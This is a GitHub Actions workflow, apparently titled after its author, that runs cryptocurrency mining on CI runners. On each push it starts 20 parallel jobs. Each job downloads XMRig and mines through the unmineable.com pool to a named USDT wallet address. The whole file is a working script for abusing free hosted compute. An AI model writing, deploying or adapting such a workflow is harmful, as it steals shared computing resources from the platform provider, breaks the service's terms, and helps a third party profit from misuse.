name: Moncef_Mega_Miner
on:
  push:
  workflow_dispatch:

jobs:
  mining:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        # تشغيل 20 نسخة من السيرفر في آن واحد
        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
    steps:
      - name: Preparation
        run: sudo apt update && sudo apt install screen -y
      - name: Start Mining
        run: |
          wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
          tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
          cd xmrig-6.21.0
          ./xmrig -o rx.unmineable.com:80 -a rx -u USDT:0xaa0ab40fa33327a4748bc0509244c646f267082a.MONCEF_GH_${{ matrix.go }} --donate-level=1
